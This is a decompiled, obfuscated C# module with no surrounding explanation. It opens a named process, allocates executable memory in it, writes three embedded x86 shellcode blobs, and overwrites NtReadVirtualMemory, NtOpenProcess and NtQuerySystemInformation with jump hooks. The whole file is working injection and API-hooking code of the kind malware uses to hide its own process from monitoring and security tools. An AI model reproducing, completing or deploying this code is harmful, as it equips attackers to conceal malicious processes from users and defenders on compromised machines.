using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;

namespace OYbMlLMDahZ;

[StandardModule]
internal sealed class YkKPjyQPCdanO
{
	public struct LFtSwVPbpUPIeCQ
	{
		public uint mCYgPWTjWfC;

		public uint ZucHkbtNuqOz;

		public uint mtUkmSWjZgwVB;

		public uint CjqOYcgoHDGSD;

		public uint aannrubNomqI;

		public IntPtr szPoqIpaPxWDNk;

		public uint NUdNaPJzhWpG;

		public IntPtr FGfpJilPSSSKmRBI;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
		public string RjWdwxjrrL;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
		public string FytRNxUbeQsSu;
	}

	private static byte[] uIRKCICBcaDJR = new byte[240]
	{
		85, 139, 236, 131, 236, 20, 86, 199, 69, 248,
		1, 0, 0, 192, 232, 0, 0, 0, 0, 88,
		37, 0, 240, 255, 255, 137, 69, 252, 255, 117,
		24, 255, 117, 20, 255, 117, 16, 255, 117, 12,
		255, 117, 8, 139, 69, 252, 131, 192, 24, 255,
		208, 137, 69, 248, 131, 125, 248, 0, 15, 140,
		168, 0, 0, 0, 255, 117, 8, 139, 69, 252,
		255, 16, 139, 240, 139, 69, 252, 255, 80, 4,
		59, 240, 116, 10, 131, 125, 8, 255, 15, 133,
		138, 0, 0, 0, 131, 101, 244, 0, 235, 7,
		139, 69, 244, 64, 137, 69, 244, 131, 125, 244,
		3, 115, 119, 139, 69, 244, 139, 77, 252, 131,
		124, 129, 12, 0, 116, 101, 139, 69, 244, 139,
		77, 252, 139, 68, 129, 12, 59, 69, 12, 114,
		86, 139, 69, 12, 3, 69, 20, 139, 77, 244,
		139, 85, 252, 57, 68, 138, 12, 115, 68, 139,
		69, 244, 139, 77, 252, 139, 68, 129, 12, 43,
		69, 12, 137, 69, 240, 131, 101, 236, 0, 235,
		7, 139, 69, 236, 64, 137, 69, 236, 131, 125,
		236, 24, 115, 33, 139, 69, 244, 107, 192, 24,
		139, 77, 252, 141, 68, 1, 24, 139, 77, 236,
		3, 77, 240, 139, 85, 16, 139, 117, 236, 138,
		4, 48, 136, 4, 10, 235, 210, 233, 124, 255,
		255, 255, 139, 69, 248, 94, 201, 194, 20, 0
	};

	private static byte[] qAdAdLyaDoQGWBAh = new byte[84]
	{
		85, 139, 236, 81, 81, 199, 69, 248, 1, 0,
		0, 192, 232, 0, 0, 0, 0, 88, 37, 0,
		240, 255, 255, 137, 69, 252, 131, 125, 20, 0,
		116, 22, 139, 69, 20, 139, 77, 252, 139, 0,
		59, 65, 8, 117, 9, 199, 69, 248, 34, 0,
		0, 192, 235, 23, 255, 117, 20, 255, 117, 16,
		255, 117, 12, 255, 117, 8, 139, 69, 252, 131,
		192, 48, 255, 208, 137, 69, 248, 139, 69, 248,
		201, 194, 16, 0
	};

	private static byte[] NGPbjuFHCgnAJYX = new byte[405]
	{
		85, 139, 236, 131, 236, 28, 86, 87, 199, 69,
		236, 1, 0, 0, 192, 232, 0, 0, 0, 0,
		88, 37, 0, 240, 255, 255, 137, 69, 240, 255,
		117, 20, 255, 117, 16, 255, 117, 12, 255, 117,
		8, 139, 69, 240, 131, 192, 72, 255, 208, 137,
		69, 236, 131, 125, 236, 0, 15, 140, 78, 1,
		0, 0, 131, 125, 8, 5, 117, 93, 131, 101,
		248, 0, 139, 69, 12, 137, 69, 244, 139, 69,
		244, 131, 56, 0, 116, 70, 139, 69, 244, 137,
		69, 248, 139, 69, 248, 139, 77, 248, 3, 8,
		137, 77, 244, 139, 69, 244, 139, 77, 240, 139,
		64, 68, 59, 65, 8, 117, 37, 139, 69, 244,
		131, 56, 0, 117, 8, 139, 69, 248, 131, 32,
		0, 235, 15, 139, 69, 248, 139, 0, 139, 77,
		244, 3, 1, 139, 77, 248, 137, 1, 139, 69,
		248, 137, 69, 244, 235, 178, 233, 235, 0, 0,
		0, 131, 125, 8, 16, 15, 133, 225, 0, 0,
		0, 139, 69, 12, 137, 69, 252, 131, 101, 232,
		0, 235, 7, 139, 69, 232, 64, 137, 69, 232,
		139, 69, 252, 139, 77, 232, 59, 8, 15, 131,
		192, 0, 0, 0, 139, 69, 232, 193, 224, 4,
		139, 77, 252, 139, 85, 240, 139, 68, 1, 4,
		59, 66, 8, 15, 133, 162, 0, 0, 0, 139,
		69, 232, 193, 224, 4, 139, 77, 252, 198, 68,
		1, 9, 0, 139, 69, 232, 193, 224, 4, 139,
		77, 252, 131, 100, 1, 16, 0, 139, 69, 232,
		193, 224, 4, 51, 201, 139, 85, 252, 102, 137,
		76, 2, 10, 139, 69, 232, 193, 224, 4, 139,
		77, 252, 131, 100, 1, 12, 0, 139, 69, 232,
		193, 224, 4, 139, 77, 252, 198, 68, 1, 8,
		0, 139, 69, 232, 193, 224, 4, 139, 77, 252,
		131, 100, 1, 4, 0, 139, 69, 232, 137, 69,
		228, 235, 7, 139, 69, 228, 64, 137, 69, 228,
		139, 69, 252, 139, 77, 228, 59, 8, 115, 33,
		139, 69, 228, 64, 193, 224, 4, 139, 77, 252,
		141, 116, 1, 4, 139, 69, 228, 193, 224, 4,
		139, 77, 252, 141, 124, 1, 4, 165, 165, 165,
		165, 235, 206, 139, 69, 252, 139, 0, 72, 139,
		77, 252, 137, 1, 139, 69, 232, 72, 137, 69,
		232, 233, 43, 255, 255, 255, 139, 69, 236, 95,
		94, 201, 194, 16, 0
	};

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool CloseHandle(IntPtr zdUyOWSeyuoVRBM);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr OpenProcess(int hAhHoSQvPXpL, bool vTqQfOYZAS, uint UVhtHKfyioWAa);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool ReadProcessMemory(IntPtr PXmtEvHGBAdVR, IntPtr cmmkoyYJYJ, [Out] byte[] YsWKzidPbRDXO, uint ckFjGBlAifu, ref uint idbUZaIkuZGM);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr HudHOOpmPuL, IntPtr TtZvLekjrEQvgTbWG, byte[] knaVvVabpzAmbRX, uint pSycctnfQVYhPM, ref uint OCqmzvNHOyn);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool VirtualProtectEx(IntPtr XLPXNYCJpvRvVnC, IntPtr UGPpdMUwPONz, uint KInRhKtKBRKgdD, uint ZZjKZAqhTId, ref uint JRqbIEangn);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool Module32Next(IntPtr ntulFaxEqmXT, ref LFtSwVPbpUPIeCQ jnPkwRmzTZyq);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool Module32First(IntPtr jAGqkqdTKDLMyxgf, ref LFtSwVPbpUPIeCQ FiMdApuWFlEvoL);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr CreateToolhelp32Snapshot(uint nPcSAbzbMFKNhc, uint DOBJvxfufkii);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr tYpZYtEjTD, IntPtr jgAQymYdtaiXXlig, uint aBWCsRVFssJXWJ, uint VVGQXXCCiBPk, uint uZGOUsSEHVfCy);

	private static byte[] ZrBLeGnSIPJlT(IntPtr GbxUKgFmYsyY, IntPtr cIzcicDSbFcRXL, uint UUYvjlSGCIYOXm)
	{
		checked
		{
			byte[] array = new byte[(int)(unchecked((ulong)UUYvjlSGCIYOXm) - 1uL) + 1];
			byte[] ysWKzidPbRDXO = array;
			uint idbUZaIkuZGM = 0u;
			ReadProcessMemory(GbxUKgFmYsyY, cIzcicDSbFcRXL, ysWKzidPbRDXO, UUYvjlSGCIYOXm, ref idbUZaIkuZGM);
			return array;
		}
	}

	private static uint RkUKcxZvQhfL(IntPtr jTgmOJHugDaW, uint xaeGpWwvfzxY, string NuPbjQvpXGAzlW)
	{
		checked
		{
			uint num = BitConverter.ToUInt32(ZrBLeGnSIPJlT(jTgmOJHugDaW, (IntPtr)(long)(unchecked((ulong)xaeGpWwvfzxY) + 60uL), 4u), 0);
			uint num2 = BitConverter.ToUInt32(ZrBLeGnSIPJlT(jTgmOJHugDaW, (IntPtr)(long)(unchecked((ulong)checked(xaeGpWwvfzxY + num)) + 120uL), 4u), 0);
			byte[] value = ZrBLeGnSIPJlT(jTgmOJHugDaW, (IntPtr)(xaeGpWwvfzxY + num2), 40u);
			int num3 = BitConverter.ToInt32(value, 24);
			uint num4 = BitConverter.ToUInt32(value, 32) + xaeGpWwvfzxY;
			uint num5 = BitConverter.ToUInt32(value, 28) + xaeGpWwvfzxY;
			uint num6 = BitConverter.ToUInt32(value, 36) + xaeGpWwvfzxY;
			IntPtr intPtr = Marshal.AllocHGlobal(64);
			int num7 = num3;
			int num8 = 1;
			while (true)
			{
				int num9 = num8;
				int num10 = num7;
				if (num9 > num10)
				{
					break;
				}
				uint num11 = BitConverter.ToUInt32(ZrBLeGnSIPJlT(jTgmOJHugDaW, (IntPtr)(long)(num4 + (ulong)((num8 - 1) * 4)), 4u), 0);
				Marshal.Copy(ZrBLeGnSIPJlT(jTgmOJHugDaW, (IntPtr)(xaeGpWwvfzxY + num11), 64u), 0, intPtr, 64);
				string strA = Marshal.PtrToStringAnsi(intPtr);
				uint num12 = (uint)BitConverter.ToInt16(ZrBLeGnSIPJlT(jTgmOJHugDaW, (IntPtr)(long)(num6 + (ulong)((num8 - 1) * 2)), 2u), 0);
				uint result = BitConverter.ToUInt32(ZrBLeGnSIPJlT(jTgmOJHugDaW, (IntPtr)(long)(num5 + unchecked((ulong)num12) * 4uL), 4u), 0) + xaeGpWwvfzxY;
				if (string.Compare(strA, NuPbjQvpXGAzlW, ignoreCase: true) != 0)
				{
					num8++;
					continue;
				}
				Marshal.FreeHGlobal(intPtr);
				return result;
			}
			Marshal.FreeHGlobal(intPtr);
			uint num13 = 0u;
			return 0u;
		}
	}

	private static IntPtr rTFroSXsUYEtT(string uYrDsfWxuQE, string DCrTblLDGbNo)
	{
		checked
		{
			IntPtr intPtr = CreateToolhelp32Snapshot(24u, (uint)Process.GetProcessesByName(uYrDsfWxuQE)[0].Id);
			IntPtr zero = IntPtr.Zero;
			if (intPtr == zero)
			{
				return zero;
			}
			LFtSwVPbpUPIeCQ FiMdApuWFlEvoL = default(LFtSwVPbpUPIeCQ);
			FiMdApuWFlEvoL.mCYgPWTjWfC = (uint)Marshal.SizeOf(FiMdApuWFlEvoL);
			if (Module32First(intPtr, ref FiMdApuWFlEvoL))
			{
				do
				{
					if (FiMdApuWFlEvoL.szPoqIpaPxWDNk.ToInt64() <= 2147483647L && string.Compare(DCrTblLDGbNo, FiMdApuWFlEvoL.RjWdwxjrrL, ignoreCase: true) == 0)
					{
						return FiMdApuWFlEvoL.szPoqIpaPxWDNk;
					}
				}
				while (Module32Next(intPtr, ref FiMdApuWFlEvoL));
			}
			return zero;
		}
	}

	private static int oBtoxIlPoeiavO(int vVKKwgNOmblR, int BWjPKQjGwvN)
	{
		return checked(vVKKwgNOmblR - BWjPKQjGwvN - 5);
	}

	public static void WBaHHVhewiQ(string pPkiVQjeAkXIQv)
	{
		byte[] array = new byte[97];
		uint[] array2 = new uint[4];
		byte[][] array3 = new byte[4][];
		uint JRqbIEangn = 0u;
		byte[] array4 = new byte[5] { 233, 0, 0, 0, 0 };
		byte[][] array5 = new byte[3][] { uIRKCICBcaDJR, qAdAdLyaDoQGWBAh, NGPbjuFHCgnAJYX };
		checked
		{
			uint num = (uint)(array5[0].Length + array5[1].Length + array5[2].Length);
			IntPtr intPtr = OpenProcess(56, vTqQfOYZAS: false, (uint)Process.GetProcessesByName(pPkiVQjeAkXIQv)[0].Id);
			IntPtr zero = IntPtr.Zero;
			uint num2 = (uint)(int)VirtualAllocEx(intPtr, zero, (uint)(unchecked((ulong)num) + 96uL), 12288u, 64u);
			uint value = (uint)(int)RkUKcxZvQhfL(intPtr, (uint)(int)rTFroSXsUYEtT(pPkiVQjeAkXIQv, "kernel32.dll"), "GetProcessId");
			uint value2 = (uint)(int)RkUKcxZvQhfL(intPtr, (uint)(int)rTFroSXsUYEtT(pPkiVQjeAkXIQv, "kernel32.dll"), "GetCurrentProcessId");
			array2[0] = (uint)(int)RkUKcxZvQhfL(intPtr, (uint)(int)rTFroSXsUYEtT(pPkiVQjeAkXIQv, "ntdll.dll"), "NtReadVirtualMemory");
			array2[1] = (uint)(int)RkUKcxZvQhfL(intPtr, (uint)(int)rTFroSXsUYEtT(pPkiVQjeAkXIQv, "ntdll.dll"), "NtOpenProcess");
			array2[2] = (uint)(int)RkUKcxZvQhfL(intPtr, (uint)(int)rTFroSXsUYEtT(pPkiVQjeAkXIQv, "ntdll.dll"), "NtQuerySystemInformation");
			array3[0] = ZrBLeGnSIPJlT(intPtr, (IntPtr)array2[0], 24u);
			array3[1] = ZrBLeGnSIPJlT(intPtr, (IntPtr)array2[1], 24u);
			array3[2] = ZrBLeGnSIPJlT(intPtr, (IntPtr)array2[2], 24u);
			BitConverter.GetBytes(value).CopyTo(array, 0);
			BitConverter.GetBytes(value2).CopyTo(array, 4);
			BitConverter.GetBytes(Process.GetCurrentProcess().Id).CopyTo(array, 8);
			BitConverter.GetBytes(array2[0]).CopyTo(array, 12);
			BitConverter.GetBytes(array2[1]).CopyTo(array, 16);
			BitConverter.GetBytes(array2[2]).CopyTo(array, 20);
			array3[0].CopyTo(array, 24);
			array3[1].CopyTo(array, 48);
			array3[2].CopyTo(array, 72);
			uint num3 = num2;
			IntPtr hudHOOpmPuL = intPtr;
			IntPtr ttZvLekjrEQvgTbWG = (IntPtr)num3;
			byte[] knaVvVabpzAmbRX = array;
			uint OCqmzvNHOyn = 0u;
			WriteProcessMemory(hudHOOpmPuL, ttZvLekjrEQvgTbWG, knaVvVabpzAmbRX, 96u, ref OCqmzvNHOyn);
			num3 = (uint)(unchecked((ulong)num3) + 96uL);
			int num4 = array5.Length - 1;
			int num5 = 0;
			while (true)
			{
				int num6 = num5;
				int num7 = num4;
				if (num6 > num7)
				{
					break;
				}
				IntPtr hudHOOpmPuL2 = intPtr;
				IntPtr ttZvLekjrEQvgTbWG2 = (IntPtr)num3;
				byte[] knaVvVabpzAmbRX2 = array5[num5];
				uint pSycctnfQVYhPM = (uint)array5[num5].Length;
				OCqmzvNHOyn = 0u;
				WriteProcessMemory(hudHOOpmPuL2, ttZvLekjrEQvgTbWG2, knaVvVabpzAmbRX2, pSycctnfQVYhPM, ref OCqmzvNHOyn);
				num3 = (uint)(num3 + (ulong)array5[num5].Length);
				num5++;
			}
			IntPtr xLPXNYCJpvRvVnC = intPtr;
			IntPtr uGPpdMUwPONz = (IntPtr)num2;
			uint kInRhKtKBRKgdD = (uint)(unchecked((ulong)num) + 96uL);
			OCqmzvNHOyn = 0u;
			VirtualProtectEx(xLPXNYCJpvRvVnC, uGPpdMUwPONz, kInRhKtKBRKgdD, 16u, ref OCqmzvNHOyn);
			num3 = (uint)(unchecked((ulong)num2) + 96uL);
			BitConverter.GetBytes(oBtoxIlPoeiavO((int)num3, (int)array2[0])).CopyTo(array4, 1);
			VirtualProtectEx(intPtr, (IntPtr)array2[0], (uint)array4.Length, 64u, ref JRqbIEangn);
			IntPtr hudHOOpmPuL3 = intPtr;
			IntPtr ttZvLekjrEQvgTbWG3 = (IntPtr)array2[0];
			byte[] knaVvVabpzAmbRX3 = array4;
			uint pSycctnfQVYhPM2 = (uint)array4.Length;
			OCqmzvNHOyn = 0u;
			WriteProcessMemory(hudHOOpmPuL3, ttZvLekjrEQvgTbWG3, knaVvVabpzAmbRX3, pSycctnfQVYhPM2, ref OCqmzvNHOyn);
			IntPtr xLPXNYCJpvRvVnC2 = intPtr;
			IntPtr uGPpdMUwPONz2 = (IntPtr)array2[0];
			uint kInRhKtKBRKgdD2 = (uint)array4.Length;
			uint zZjKZAqhTId = JRqbIEangn;
			OCqmzvNHOyn = 0u;
			VirtualProtectEx(xLPXNYCJpvRvVnC2, uGPpdMUwPONz2, kInRhKtKBRKgdD2, zZjKZAqhTId, ref OCqmzvNHOyn);
			num3 = (uint)(num3 + (ulong)array5[0].Length);
			BitConverter.GetBytes(oBtoxIlPoeiavO((int)num3, (int)array2[1])).CopyTo(array4, 1);
			VirtualProtectEx(intPtr, (IntPtr)array2[1], (uint)array4.Length, 64u, ref JRqbIEangn);
			IntPtr hudHOOpmPuL4 = intPtr;
			IntPtr ttZvLekjrEQvgTbWG4 = (IntPtr)array2[1];
			byte[] knaVvVabpzAmbRX4 = array4;
			uint pSycctnfQVYhPM3 = (uint)array4.Length;
			OCqmzvNHOyn = 0u;
			WriteProcessMemory(hudHOOpmPuL4, ttZvLekjrEQvgTbWG4, knaVvVabpzAmbRX4, pSycctnfQVYhPM3, ref OCqmzvNHOyn);
			IntPtr xLPXNYCJpvRvVnC3 = intPtr;
			IntPtr uGPpdMUwPONz3 = (IntPtr)array2[1];
			uint kInRhKtKBRKgdD3 = (uint)array4.Length;
			uint zZjKZAqhTId2 = JRqbIEangn;
			OCqmzvNHOyn = 0u;
			VirtualProtectEx(xLPXNYCJpvRvVnC3, uGPpdMUwPONz3, kInRhKtKBRKgdD3, zZjKZAqhTId2, ref OCqmzvNHOyn);
			num3 = (uint)(num3 + (ulong)array5[1].Length);
			BitConverter.GetBytes(oBtoxIlPoeiavO((int)num3, (int)array2[2])).CopyTo(array4, 1);
			VirtualProtectEx(intPtr, (IntPtr)array2[2], (uint)array4.Length, 64u, ref JRqbIEangn);
			IntPtr hudHOOpmPuL5 = intPtr;
			IntPtr ttZvLekjrEQvgTbWG5 = (IntPtr)array2[2];
			byte[] knaVvVabpzAmbRX5 = array4;
			uint pSycctnfQVYhPM4 = (uint)array4.Length;
			OCqmzvNHOyn = 0u;
			WriteProcessMemory(hudHOOpmPuL5, ttZvLekjrEQvgTbWG5, knaVvVabpzAmbRX5, pSycctnfQVYhPM4, ref OCqmzvNHOyn);
			IntPtr xLPXNYCJpvRvVnC4 = intPtr;
			IntPtr uGPpdMUwPONz4 = (IntPtr)array2[2];
			uint kInRhKtKBRKgdD4 = (uint)array4.Length;
			uint zZjKZAqhTId3 = JRqbIEangn;
			OCqmzvNHOyn = 0u;
			VirtualProtectEx(xLPXNYCJpvRvVnC4, uGPpdMUwPONz4, kInRhKtKBRKgdD4, zZjKZAqhTId3, ref OCqmzvNHOyn);
			CloseHandle(intPtr);
		}
	}
}
